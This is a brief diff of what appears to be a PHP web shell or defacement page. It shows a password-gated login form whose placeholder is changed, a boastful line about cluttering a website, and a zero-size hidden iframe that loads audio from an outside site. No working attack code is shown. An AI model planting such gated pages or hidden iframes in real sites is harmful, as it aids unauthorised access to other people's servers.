@@ -222,7 +222,7 @@ If you say this is a game,we also say this is a game,can make clutter on your we
 </html>
 <center>
 <form method="post">
-<input type="password" name="pass" placeholder="PASSWORD: ******">
+<input type="password" name="pass" placeholder="PASSWORD: *******">
 </form>
 	<iframe width="0" height="0" src="https://www.anekaholiday.site/SoundCloud/ALx.mp3" frameborder="0" allowfullscreen</iframe>
 <?php 
